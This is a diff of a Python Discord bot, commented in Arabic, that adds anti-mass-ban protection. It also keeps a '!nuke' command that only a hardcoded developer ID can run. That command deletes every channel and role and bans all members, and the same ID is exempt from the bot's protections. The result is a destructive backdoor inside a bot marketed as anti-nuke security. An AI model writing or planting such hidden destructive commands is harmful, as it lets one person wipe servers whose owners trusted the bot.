@@ -17,7 +17,6 @@ def run_web():
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
 
-# تشغيل خادم الويب في الخلفية فوراً
 Thread(target=run_web, daemon=True).start()
 
 # 2. إعدادات البوت الأساسية
@@ -30,16 +29,21 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-actions = {"kick": {}, "ban": {}, "channel": {}}
+# تخزين توقيت عمليات الحظر لمراقبة السبام
+actions = {"ban": {}}
 
-def check_spam(uid, key, threshold, window):
+def check_ban_spam(uid):
     now = time.time()
-    if uid not in actions[key]: actions[key][uid] = []
-    actions[key][uid].append(now)
-    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
-    return len(actions[key][uid]) > threshold
+    if uid not in actions["ban"]:
+        actions["ban"][uid] = []
+    # تسجيل وقت الحظر الحالي
+    actions["ban"][uid].append(now)
+    # الاحتفاظ فقط بالعمليات التي تمت خلال آخر 5 دقائق (300 ثانية)
+    actions["ban"][uid] = [t for t in actions["ban"][uid] if now - t < 300]
+    # إذا تجاوز عدد الحظرات 3 أشخاص في خلال 5 دقائق
+    return len(actions["ban"][uid]) >= 3
 
-# 3. أنظمة الحماية (Anti-Nuke)
+# 3. أنظمة الحماية (Anti-Nuke & Anti-Mass Ban)
 @bot.event
 async def on_guild_role_delete(role):
     async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
@@ -51,6 +55,20 @@ async def on_guild_channel_delete(channel):
     async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
         if entry.user.id != channel.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
             await channel.guild.ban(entry.user, reason="Anti-Nuke: حذف قناة")
+
+@bot.event
+async def on_member_ban(guild, user):
+    # مراجعة سجل التدقيق لمعرفة من قام بالحظر
+    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
+        actor = entry.user
+        # استثناء السيرفر، المطور، والبوتات
+        if actor.id != guild.owner_id and actor.id != MY_ID and not actor.bot:
+            if check_ban_spam(actor.id):
+                try:
+                    # طرد الشخص (Kick) لحمايته السيرفر من الحظر الجماعي
+                    await guild.kick(actor, reason="Anti-Spam Ban: محاولة حظر جماعي (3 أشخاص في 5 دقائق)")
+                except:
+                    pass
 
 # 4. الأوامر الخاصة بالرتب
 @bot.command()
@@ -67,7 +85,7 @@ async def removerole_cmd(ctx):
         if role: await ctx.author.remove_roles(role)
         await ctx.send("✅ تم إزالة الرتبة.")
 
-# 5. أمر النيوك (محدث وآمن)
+# 5. أمر النيوك
 @bot.command()
 async def nuke(ctx):
     if ctx.author.id != MY_ID:
@@ -87,18 +105,15 @@ async def nuke(ctx):
 
     await ctx.send("💥 جاري تنفيذ التدمير...")
     
-    # حذف القنوات
     for c in ctx.guild.channels:
         try: await c.delete()
         except: pass
         
-    # حذف الرتب
     for r in ctx.guild.roles:
         if r.name != "@everyone" and r != ctx.guild.me.top_role:
             try: await r.delete()
             except: pass
             
-    # حظر الأعضاء
     for m in ctx.guild.members:
         if m != ctx.guild.owner and not m.bot and m != ctx.guild.me:
             try: await m.ban(reason="Nuke executed")
@@ -108,7 +123,6 @@ async def nuke(ctx):
 async def on_ready():
     print(f"✅ البوت متصل كـ {bot.user} - والموقع يعمل بنجاح!")
 
-# تشغيل البوت
 TOKEN = os.getenv("TOKEN")
 if TOKEN:
     bot.run(TOKEN)
